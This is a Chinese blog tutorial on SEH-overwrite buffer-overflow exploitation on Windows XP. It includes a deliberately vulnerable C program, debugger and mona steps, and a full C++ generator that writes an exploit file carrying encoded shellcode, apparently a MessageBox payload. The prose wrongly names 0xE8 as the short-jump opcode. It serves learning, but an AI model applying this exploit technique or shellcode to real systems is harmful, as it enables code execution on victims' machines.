\-\-- layout: post title: 淺談Windows上Buffer
Overflow中SEH異常處理機制攻擊手法＆Shellcode插入手法 date:
\'2015-05-21T10:53:00.001-07:00\' author: 聖豪馬 tags: - Dev C++ - BOF -
Windows - CPlus - ASM - Debugger modified\_time:
\'2015-06-01T04:43:40.385-07:00\' thumbnail:
http://4.bp.blogspot.com/-SGk56qE0Nac/VV4VebzTNVI/AAAAAAAAGZg/63DxTtv1NLg/s72-c/%25E8%259E%25A2%25E5%25B9%2595%25E5%25BF%25AB%25E7%2585%25A7%2B2015-05-22%2B%25E4%25B8%258A%25E5%258D%25881.27.06.png
blogger\_id:
tag:blogger.com,1999:blog-1335849442109808564.post-8012820621909174085
blogger\_orig\_url:
http://helloadr.blogspot.com/2015/05/windowsbuffer-overflowsehshellcode.html
\-\--

::: {.separator style="clear: both; text-align: center;"}
:::

此篇內容接續著前幾篇Blog文：\

-   [從PE架構淺談純組語撈出當前進程的映像路徑 ](http://helloadr.blogspot.tw/2015/04/windowspeasmcepe.html)
-   [從PE架構到模組架構到暴力列舉模組找模組位置（如Kernel32.dll） ](http://helloadr.blogspot.tw/2015/04/windowspeasmcepekernel32dll.html)
-   [純組語手幹Dll
    Header解析外導函數表撈出函數地址（如LoadLibraryA動態地址） ](http://helloadr.blogspot.tw/2015/05/windowspeasmdll-headerapiloadlibrarya.html)
-   [你知道聽歌也會中毒嗎？初探BOF攻擊、KMPlayer
    MP3漏洞利用](http://helloadr.blogspot.tw/2015/05/bofkmplayer-mp3adr.html)

參考文獻
--------

1.  [緩衝區溢位攻擊：第四章 -
    真槍實彈 ](http://securityalley.blogspot.tw/2014/09/blog-post.html)
2.  [緩衝區溢位攻擊：第五章 -
    攻擊的變化](http://securityalley.blogspot.tw/2014/11/blog-post.html)

最近時間很緊湊啊\...還是慢慢看這本電子書內容，挑出一點細節還有大概的精華整理成自己的筆記了XD，因為這部分技術很繁瑣又很多細項，所以筆記都是整理給自己看怕自己老人癡呆忘記用的（？），如果是大牛們請飄過吧(´･\_･\`)\

<div>

\

</div>

::: {.separator style="clear: both; text-align: center;"}
[![](http://4.bp.blogspot.com/-SGk56qE0Nac/VV4VebzTNVI/AAAAAAAAGZg/63DxTtv1NLg/s400/%25E8%259E%25A2%25E5%25B9%2595%25E5%25BF%25AB%25E7%2585%25A7%2B2015-05-22%2B%25E4%25B8%258A%25E5%258D%25881.27.06.png){width="400"
height="151"}](http://4.bp.blogspot.com/-SGk56qE0Nac/VV4VebzTNVI/AAAAAAAAGZg/63DxTtv1NLg/s1600/%25E8%259E%25A2%25E5%25B9%2595%25E5%25BF%25AB%25E7%2585%25A7%2B2015-05-22%2B%25E4%25B8%258A%25E5%258D%25881.27.06.png)
:::

<div>

\

</div>

<div>

[**＊PS：此篇文章實做測試於Windows XP
SP3版本上，若使用Vista或者更高版本將可能遇到DEP防護導致Shellcode屬性不可被執行而無法成功攻擊唷XD**]{style="color: red;"}

</div>

<div>

\

</div>

**首先，SEH是什麼？**
---------------------

<div>

SEH全名為Structured Exception
Handling，在MSDN上可以查到微軟官方提供的資訊在此：[Structured Exception
Handling (Windows) - MSDN -
Microsoft](https://msdn.microsoft.com/en-us/library/windows/desktop/ms680657(v=vs.85).aspx)，當你正在使用的程式遇到異外情形是不合乎邏輯或者違法處置的時候，程式無法自己處理，一般來說會先給try處理（而try的註冊資訊也會註冊於SEH鏈結內）當try內也無法處理掉時會交由Debugger處理，若Debugger也無法處理時（或者當下沒有被Debugger
Attach時），最後就會把處理權交由系統來做處理（如下圖所示）

</div>

::: {.separator style="clear: both; text-align: center;"}
[![](http://3.bp.blogspot.com/-SbLe-sF9O90/VV4pFwKopxI/AAAAAAAAGZw/l-UXTgD5JiM/s320/%25E8%259E%25A2%25E5%25B9%2595%25E5%25BF%25AB%25E7%2585%25A7%2B2015-05-22%2B%25E4%25B8%258A%25E5%258D%25882.50.48.png){width="320"
height="197"}](http://3.bp.blogspot.com/-SbLe-sF9O90/VV4pFwKopxI/AAAAAAAAGZw/l-UXTgD5JiM/s1600/%25E8%259E%25A2%25E5%25B9%2595%25E5%25BF%25AB%25E7%2585%25A7%2B2015-05-22%2B%25E4%25B8%258A%25E5%258D%25882.50.48.png)
:::

::: {.separator style="clear: both; text-align: center;"}
\
:::

<div>

系統就會根據當下環境整理出記憶體傾印資訊，然後問你要不要回傳給開發者，或者要選擇手動處理這個問題（不過我沒用過上面任何一個功能就是了XD）

</div>

<div>

\

</div>

<div>

那麼SEH在Windows上是怎麼運作的呢？

</div>

<div>

可以之前我寫的本系列文章的第一篇[從PE架構淺談純組語撈出當前進程的映像路徑 ](http://helloadr.blogspot.tw/2015/04/windowspeasmcepe.html)，當初在介紹每個線程中都有個TEB結構體（Thread
Environment Block），而線程會根據被分配的ASM
Script一直做一個個Opcode解析並且執行的動作。\
\
但如果哪天解析Opcode在執行的時候遇到異常（例如：整數除零、跨線程UI物件存取、陣列Unrange問題、記憶體違法存取\...等），這時候線程就會停下來，然後找出TEB中在Offset
0上的TIB（Thread Information
Block）中的ExceptionList陣列中的子成員，然後要求第一個成員替我們處理問題，如果第一個成員處理不了就由第二個，如此一直交棒下去直到解決為止，可以參考一下電子書中提供的Windgb之下使用指令
dt ntdll!\_NT\_TIB 如下：\

``` {.WINDBG style="font-size: 12px !important; line-height: 15px !important;"}
0:000> dt ntdll!_NT_TIB
   +0x000 ExceptionList    : Ptr32 _EXCEPTION_REGISTRATION_RECORD
   +0x004 StackBase        : Ptr32 Void
   +0x008 StackLimit       : Ptr32 Void
   +0x00c SubSystemTib     : Ptr32 Void
   +0x010 FiberData        : Ptr32 Void
   +0x010 Version          : Uint4B
   +0x014 ArbitraryUserPointer : Ptr32 Void
   +0x018 Self             : Ptr32 _NT_TIB
```

``` {.WINDBG style="font-size: 12px !important; line-height: 15px !important;"}
```

</div>

\
可以看到一個重點！在Offset為0上指向了一個名為ExceptionList的鍊狀結構，而該鏈狀結構陣列的子成員之類別\_EXCEPTION\_REGISTRATION\_RECORD結構體如下：\

``` {.brush: .cpp;}
typedef struct _EXCEPTION_REGISTRATION_RECORD {
    struct _EXCEPTION_REGISTRATION_RECORD *Next;//0x00
    PEXCEPTION_ROUTINE Handler;//0x04
} EXCEPTION_REGISTRATION_RECORD;
```

可以看到每一個成員中都有兩個變數，第一個變數（Offset
0x00）指向下一個\_EXCEPTION\_REGISTRATION\_RECORD的成員（也就是今天如果第一個成員要交棒，就會交棒給第一個變數指向的該成員）；而Handler是什麼呢？Handler就是負責解決這個異常事情者。\
\
整個具體異常處理過程可參考 [緩衝區溢位攻擊：第五章 -
攻擊的變化](http://securityalley.blogspot.tw/2014/11/blog-post.html) 文中此圖：\

::: {.separator style="clear: both; text-align: center;"}
[![](http://1.bp.blogspot.com/-nj3kZwF6aBI/VFr0hg6XReI/AAAAAAAAB_U/TE4Ig5mdVUE/s1600/Diagram9.png){width="640"
height="226"}](http://1.bp.blogspot.com/-nj3kZwF6aBI/VFr0hg6XReI/AAAAAAAAB_U/TE4Ig5mdVUE/s1600/Diagram9.png)
:::

\
所以可以理解到今天一個異常發生時，在Windows下的處理狀況會是：\
\

1.  取出TEB的TIB資訊中的ExceptionList第一個成員
2.  將當前成員中的Handler指向的地址寫入到EIP並且跳進去該地址
3.  當Handler處理異常無法解決問題時，取出當前成員的Next，交棒給下個成員
4.  重複 1 \~ 3，直到問題解決，否則到串列結尾時交由系統處理\
    （也就是問要不要回報的那個醜醜的視窗啦）

\
OK，知識知道到這邊，那麼我們就可以開始著手研究實際運用\
\

實際運用
--------

<div>

首先我們要寫一個簡單的含有Buffer
Overflow問題的例子來檢視整個SEH的利用過程，這邊引用到 [緩衝區溢位攻擊：第五章
-
攻擊的變化](http://securityalley.blogspot.tw/2014/11/blog-post.html) 中的例子：

</div>

<div>

\

</div>

``` {.brush: .cpp;}
#include <stdlib.h>
#include <stdio.h>

void do_something(FILE *pfile)
{   
     char buf[128];
     fscanf(pfile, "%s", buf);
}

int main(int argc, char **argv)
{
    char dummy[1024];
    FILE *pfile;
    printf("Vulnerable001 starts...\n");
    if(argc>=2) pfile = fopen(argv[1], "r");
    if(pfile) do_something(pfile);
    printf("Vulnerable001 ends....\n");
}
```

\
這邊使用Dev
C++編譯後，可以生產出一支執行程式，該程式會讀取傳入之文檔並讀取文字入char
buf\[128\]緩衝區內做保存；這邊有什麼問題呢？主要問題出在fscanf在寫入文檔文字入buf內時，若文檔中文字超過ascii的128個字時，開始就會寫入到buf以外的記憶體內容導致BOF問題。\
\
那我們該怎麼分析呢？\
首先我們可以得知緩衝區大小其實只有128，所以可以先開一個新的記事本文檔，裡面隨便輸入文字輸入超過128個字（這邊我一共輸入了130個A）然後保存起來。\

::: {.separator style="clear: both; text-align: center;"}
[![](http://3.bp.blogspot.com/-9VOCZBaj5lg/VV4rnAKVUYI/AAAAAAAAGZ8/MbbO34W-dvg/s400/%25E8%259E%25A2%25E5%25B9%2595%25E5%25BF%25AB%25E7%2585%25A7%2B2015-05-22%2B%25E4%25B8%258A%25E5%258D%25882.59.22.png){width="382"
height="400"}](http://3.bp.blogspot.com/-9VOCZBaj5lg/VV4rnAKVUYI/AAAAAAAAGZ8/MbbO34W-dvg/s1600/%25E8%259E%25A2%25E5%25B9%2595%25E5%25BF%25AB%25E7%2585%25A7%2B2015-05-22%2B%25E4%25B8%258A%25E5%258D%25882.59.22.png)
:::

接著把這個文本拖移到編譯好的exe上，讓exe載入這個文本後會發現狀況如下：\

::: {.separator style="clear: both; text-align: center;"}
[![](http://2.bp.blogspot.com/-QMYvKqyxYq4/VV4sg_JyWuI/AAAAAAAAGaE/U2X66gHXWjY/s640/%25E8%259E%25A2%25E5%25B9%2595%25E5%25BF%25AB%25E7%2585%25A7%2B2015-05-22%2B%25E4%25B8%258A%25E5%258D%25883.05.21.png){width="640"
height="416"}](http://2.bp.blogspot.com/-QMYvKqyxYq4/VV4sg_JyWuI/AAAAAAAAGaE/U2X66gHXWjY/s1600/%25E8%259E%25A2%25E5%25B9%2595%25E5%25BF%25AB%25E7%2585%25A7%2B2015-05-22%2B%25E4%25B8%258A%25E5%258D%25883.05.21.png)
:::

因為這個例子沒有包try之類的異常處理，所以很快地就直接把異常訊息交給系統處理了（SEH上沒有任何Handler可以處理這件事情）\
\
那麼很快的可以來測試一下出錯異常狀況，開啟Immunity
Debugger，另外記事本內的文字改成1500個A來做實際測試（至於為什麼是1500個\...推測SEH是當前線程從整個程式入口就開始計算，所以堆疊順序上才需要連dummy的1024的buffer都算進去；不過這點我無法給很明確的答案，確定的是原本的130個字是不夠大去覆蓋到SEH的）\

::: {.separator style="clear: both; text-align: center;"}
[![](http://1.bp.blogspot.com/-unNnwAm-AGQ/VV4vJN5yTdI/AAAAAAAAGaQ/debcvgwRIBM/s400/%25E8%259E%25A2%25E5%25B9%2595%25E5%25BF%25AB%25E7%2585%25A7%2B2015-05-22%2B%25E4%25B8%258A%25E5%258D%25883.16.31.png){width="400"
height="292"}](http://1.bp.blogspot.com/-unNnwAm-AGQ/VV4vJN5yTdI/AAAAAAAAGaQ/debcvgwRIBM/s1600/%25E8%259E%25A2%25E5%25B9%2595%25E5%25BF%25AB%25E7%2585%25A7%2B2015-05-22%2B%25E4%25B8%258A%25E5%258D%25883.16.31.png)
:::

接著開啟程式後，按下F9放推～接著很快就會看到Debugger停在此：\

::: {.separator style="clear: both; text-align: center;"}
[![](http://2.bp.blogspot.com/-KQcnUrsuXJw/VV4wCT57YlI/AAAAAAAAGag/fVyQc0BGpHE/s640/%25E8%259E%25A2%25E5%25B9%2595%25E5%25BF%25AB%25E7%2585%25A7%2B2015-05-22%2B%25E4%25B8%258A%25E5%258D%25883.20.21.png){width="640"
height="342"}](http://2.bp.blogspot.com/-KQcnUrsuXJw/VV4wCT57YlI/AAAAAAAAGag/fVyQc0BGpHE/s1600/%25E8%259E%25A2%25E5%25B9%2595%25E5%25BF%25AB%25E7%2585%25A7%2B2015-05-22%2B%25E4%25B8%258A%25E5%258D%25883.20.21.png)
:::

這邊可以看到在寫入時發生記憶體寫入異常，所以Debugger接到異常訊息就停止在此，在ECX這邊可以看到我們文字檔內的1500個A已經覆蓋進來了。所以在一般沒有Debugger的情況下，如果程式走到這一步發生異常，因為沒有Debugger
Attach上，就會把這個異常事件交由SEH成員來處理，若連SEH上成員都無法解決此問題，最後就會彈出系統訊息問使用者要不要回報此項錯誤訊息。\
\
接著我們可以下指令：!mona
seh，這個指令可以讓我們看到發生異常時，當前異常如果我們不處理，將會把事件交給哪幾個Handler來自動處理掉\

::: {.separator style="clear: both; text-align: center;"}
[![](http://2.bp.blogspot.com/-UyOfYWzeX74/VV4xRIvlOrI/AAAAAAAAGas/khpEDN2Ft1U/s400/%25E8%259E%25A2%25E5%25B9%2595%25E5%25BF%25AB%25E7%2585%25A7%2B2015-05-22%2B%25E4%25B8%258A%25E5%258D%25883.25.28.png){width="400"
height="270"}](http://2.bp.blogspot.com/-UyOfYWzeX74/VV4xRIvlOrI/AAAAAAAAGas/khpEDN2Ft1U/s1600/%25E8%259E%25A2%25E5%25B9%2595%25E5%25BF%25AB%25E7%2585%25A7%2B2015-05-22%2B%25E4%25B8%258A%25E5%258D%25883.25.28.png)
:::

這邊可以看到我們文字檔中的A已經成功覆蓋到SEH中的第一個成員了（\'A\'的ASCII為0x41），而這份SEH鏈由上往下看是有時間先後的，最上面的是越早註冊異常處理的Handler，越下面的越晚；所以當一個異常事件發生時，0x0022FFE0上的Handler
0x41414141會先接管（而0x0022FFE0為下一個成員的指標）如果當前0x41414141此Handler無法處理這個異常事件，將會把異常往上交給0x0022FA48上的\_except\_handler3處理（若又無法處理則繼續往上找成員處理）\
\

::: {.separator style="clear: both; text-align: center;"}
[![](http://1.bp.blogspot.com/-4Zx8ldQ8kCU/VV4y0tyw-zI/AAAAAAAAGa4/L4SoOuNsZjw/s640/%25E8%259E%25A2%25E5%25B9%2595%25E5%25BF%25AB%25E7%2585%25A7%2B2015-05-22%2B%25E4%25B8%258A%25E5%258D%25883.32.09.png){width="640"
height="244"}](http://1.bp.blogspot.com/-4Zx8ldQ8kCU/VV4y0tyw-zI/AAAAAAAAGa4/L4SoOuNsZjw/s1600/%25E8%259E%25A2%25E5%25B9%2595%25E5%25BF%25AB%25E7%2585%25A7%2B2015-05-22%2B%25E4%25B8%258A%25E5%258D%25883.32.09.png)
:::

\
接著我們可以在Immunity Debugger上按下Shift +
F9強制繼續執行（將進入SEH機制處理），便會把0x0022FFE0的Handler
0x41414141放入EIP執行，但因為0x41414141並不是一個正確可以執行的位置，就會卡在此無法繼續往下跑，這時候可以發現當異常出現時，不一定要像之前BOF都是透過覆蓋ret的地址來實現跳轉，我們也可以透過Windows的異常處理機制來控制EIP要跳轉到哪，接下來我們就得想辦法算出Handler上的0x41414141跟下一個成員的Offset是多少。\
\
接著使用!mona pattern\_create
1500，然後把生產好的Pattern放入記事本中，在執行一次（細節步驟可參考前一篇文章 [你知道聽歌也會中毒嗎？初探BOF攻擊、KMPlayer
MP3漏洞利用](http://helloadr.blogspot.tw/2015/05/bofkmplayer-mp3adr.html)）看看這次放入mona的Pattern後SEH被覆蓋的狀況：\

::: {.separator style="clear: both; text-align: center;"}
[![](http://3.bp.blogspot.com/-oKckgkwQTEo/VV400pdJg1I/AAAAAAAAGbE/BNw4oqjBAJA/s640/%25E8%259E%25A2%25E5%25B9%2595%25E5%25BF%25AB%25E7%2585%25A7%2B2015-05-22%2B%25E4%25B8%258A%25E5%258D%25883.40.47.png){width="640"
height="160"}](http://3.bp.blogspot.com/-oKckgkwQTEo/VV400pdJg1I/AAAAAAAAGbE/BNw4oqjBAJA/s1600/%25E8%259E%25A2%25E5%25B9%2595%25E5%25BF%25AB%25E7%2585%25A7%2B2015-05-22%2B%25E4%25B8%258A%25E5%258D%25883.40.47.png)
:::

可以根據SEH狀況使用!mona
pattern\_offset算出最後一個被覆蓋的SEH結構體指向的Handler（也就是我們可以控制的EIP）實質上在記事本上文字Offset為1396，而此結構體指向的下一個成員Offset為1392；為什麼要特別提下一個成員（0x0022FFE0
= Next）呢？可以實際Debugger跟蹤到Shift +
F9系統把Handler的地址設為EIP的當下：\

::: {.separator style="clear: both; text-align: center;"}
[![](http://3.bp.blogspot.com/-qyER4eNixOs/VV43JMGS5-I/AAAAAAAAGbQ/Wd_-4k5jxOU/s640/%25E8%259E%25A2%25E5%25B9%2595%25E5%25BF%25AB%25E7%2585%25A7%2B2015-05-22%2B%25E4%25B8%258A%25E5%258D%25883.49.23.png){width="640"
height="278"}](http://3.bp.blogspot.com/-qyER4eNixOs/VV43JMGS5-I/AAAAAAAAGbQ/Wd_-4k5jxOU/s1600/%25E8%259E%25A2%25E5%25B9%2595%25E5%25BF%25AB%25E7%2585%25A7%2B2015-05-22%2B%25E4%25B8%258A%25E5%258D%25883.49.23.png)
:::

會發現在ESP +
8處這裏保存著Next的指標（4BYTE）耶！這很重要嗎？很重要！因為Shellcode我們得塞在Buffer內在被載入時一併存入記憶體，但我們EIP不可能直接知道Shellcode在記憶體中起點在哪，於是這個Next的4BYTE保存點正好可以讓我們利用來當作一個小的跳板（jmp
short）利用這個跳板我們可以再往前跳到Shellcode起點開始跑Shellcode，所以我們的目標如下（參考至電子書中Shellcode安排）：\

``` {style="font-size: 12px !important; line-height: 15px !important;"}
  大約 1344-300-8 bytes      大約 300 bytes       大約 8 bytes   4 bytes  4 bytes
|-------- ... ---------||------- ... --------||--------------||-------||-------|
          NOPs                Shellcode         2nd jumpcode     Next   Handler
```

<div>

\

</div>

<div>

那麼我們該如何把EIP跳到Next的記憶體空間（4BYTE）上？可以利用組語的：\

``` {.brush: .cpp;}
pop eax
pop ecx
ret //上面兩個pop 會釋放掉8BYTE，於是[ESP+8]就變成返回位置
```

\
至於想要快速找到記憶體中這樣類型的指令在哪，可以透過指令：!mona
seh（也就是剛剛我們拿來看SEH鏈狀成員的指令），然後觀看Log視窗可以得知\

::: {.separator style="clear: both; text-align: center;"}
[![](http://1.bp.blogspot.com/-ixKJt732vpQ/VV47wpY5TzI/AAAAAAAAGbc/F4oWg1vLr9E/s640/%25E8%259E%25A2%25E5%25B9%2595%25E5%25BF%25AB%25E7%2585%25A7%2B2015-05-22%2B%25E4%25B8%258A%25E5%258D%25884.10.12.png){width="640"
height="172"}](http://1.bp.blogspot.com/-ixKJt732vpQ/VV47wpY5TzI/AAAAAAAAGbc/F4oWg1vLr9E/s1600/%25E8%259E%25A2%25E5%25B9%2595%25E5%25BF%25AB%25E7%2585%25A7%2B2015-05-22%2B%25E4%25B8%258A%25E5%258D%25884.10.12.png)
:::

mona替我們把這種類型的跳轉都整理出來了，這邊我選用了自己程式上的模組（exe.exe）穩定性比較高不會因為系統API模組變動而影響，我選了0x004019CE這個位置（放置在EIP上）\
\
再來是Next上的4BYTE該怎麼用？我們得用jmp short -8（往前跳）\
轉換為BYTE Code為 0xE8、0xF6（jmp short為0xE8，-8 = 0x00 - 0x08 =
0xF6）\
不過為了補足四個字，後面還得塞兩個BYTE，可以隨便塞不影響結果\
（這邊我塞的是兩個nop，0x90、0x90）\
\
至於8BYTE上的二段跳則是使用jmp long -300，也就是jmp long - 0x012C\
轉換為BYTE Code為 0xE9、0xCF、0xFE、0xFF、0xFF\
（jmp long接DWORD為4BYTE，0x00000000 - 0x012C = 0xFFFFFECF）\
\
最後可以按照原文中安排的Shellcode形式，寫出以下Code：\
\

</div>

``` {.brush: .cpp;}
#include 
#include 
#include 
using namespace std;
#define FILENAME "Vulnerable001_Excp_Exploit.txt"
   
//Reading "e:\asm\messagebox-shikata.bin"
//Size: 288 bytes
//Count per line: 19
char code[] =
"\xba\xb1\xbb\x14\xaf\xd9\xc6\xd9\x74\x24\xf4\x5e\x31\xc9\xb1\x42\x83\xc6\x04"
"\x31\x56\x0f\x03\x56\xbe\x59\xe1\x76\x2b\x06\xd3\xfd\x8f\xcd\xd5\x2f\x7d\x5a"
"\x27\x19\xe5\x2e\x36\xa9\x6e\x46\xb5\x42\x06\xbb\x4e\x12\xee\x48\x2e\xbb\x65"
"\x78\xf7\xf4\x61\xf0\xf4\x52\x90\x2b\x05\x85\xf2\x40\x96\x62\xd6\xdd\x22\x57"
"\x9d\xb6\x84\xdf\xa0\xdc\x5e\x55\xba\xab\x3b\x4a\xbb\x40\x58\xbe\xf2\x1d\xab"
"\x34\x05\xcc\xe5\xb5\x34\xd0\xfa\xe6\xb2\x10\x76\xf0\x7b\x5f\x7a\xff\xbc\x8b"
"\x71\xc4\x3e\x68\x52\x4e\x5f\xfb\xf8\x94\x9e\x17\x9a\x5f\xac\xac\xe8\x3a\xb0"
"\x33\x04\x31\xcc\xb8\xdb\xae\x45\xfa\xff\x32\x34\xc0\xb2\x43\x9f\x12\x3b\xb6"
"\x56\x58\x54\xb7\x26\x53\x49\x95\x5e\xf4\x6e\xe5\x61\x82\xd4\x1e\x26\xeb\x0e"
"\xfc\x2b\x93\xb3\x25\x99\x73\x45\xda\xe2\x7b\xd3\x60\x14\xec\x88\x06\x04\xad"
"\x38\xe4\x76\x03\xdd\x62\x03\x28\x78\x01\x63\x92\xa6\xef\xfa\xcd\xf1\x10\xa9"
"\x15\x77\x2c\x01\xad\x2f\x13\xec\x6d\xa8\x48\xca\xdf\x5f\x11\xed\x1f\x60\xba"
"\x21\xd9\xc7\x1b\x29\x7f\x97\x35\x90\x4e\xbc\x42\xbe\x94\x44\xda\xdd\xbd\x69"
"\x84\x01\x1e\x02\x5b\x33\x32\xb6\xcb\xdc\xe6\x16\x5b\x4a\xbf\x33\x0f\xe6\x0e"
"\x75\x47\xba\x54\x88\xd1\xa3\xa4\x40\x8b\x13\x94\x35\x1e\xac\xca\x87\x5e\x02"
"\x14\xb2\x56";
//NULL count: 0
   
int main() 
{
    string Next("\xEB\xF6\x90\x90");  // jmp short -0x08 # NOP x 2
    string Handler("\xCE\x19\x40\x00") ; // 0x004019CE
    string shellcode(code);
    string second_jumpcode("\xE9\xCF\xFE\xFF\xFF\x90\x90\x90"); //jmp -0x12c #NOP x 3
    string nops(1392 - shellcode.size() - second_jumpcode.size(), '\x90');
    ofstream fout(FILENAME, ios::binary);
    fout << nops << shellcode << second_jumpcode << Next << Handler;
}
```

使用Dev
C++編譯完成後開啟，將會在目錄底下生產一個Vulnerable001\_Excp\_Exploit.txt記事本，將此記事本丟給一開始我們寫的有BOF漏洞的程式做讀取結果如下：\

::: {.separator style="clear: both; text-align: center;"}
[![](http://3.bp.blogspot.com/-FAS4XFkYUp0/VV4--hqVXkI/AAAAAAAAGbk/qJNlrOi2EwA/s640/%25E8%259E%25A2%25E5%25B9%2595%25E5%25BF%25AB%25E7%2585%25A7%2B2015-05-22%2B%25E4%25B8%258A%25E5%258D%25884.24.08.png){width="640"
height="418"}](http://3.bp.blogspot.com/-FAS4XFkYUp0/VV4--hqVXkI/AAAAAAAAGbk/qJNlrOi2EwA/s1600/%25E8%259E%25A2%25E5%25B9%2595%25E5%25BF%25AB%25E7%2585%25A7%2B2015-05-22%2B%25E4%25B8%258A%25E5%258D%25884.24.08.png)
:::

\

後記
----

那份Shellcode跟Code是用自電子書原本的Code，Shellcode部分要避免Shellcode中用到0x00這個BYTE被Windows的文字處理當作\'\\x00\'結束語，必須使用編碼器之類替Shellcode上加上編碼器來避免有Bad
Char導致Shellcode無法完整被載入，但因為我不知道Windows下有啥好用的編碼器\...我也不知道怎麼裝Metasploit，就拿原版的來改啦！\
\
如果有研究的大神可以提供一下Plz \<(\_ \_)\>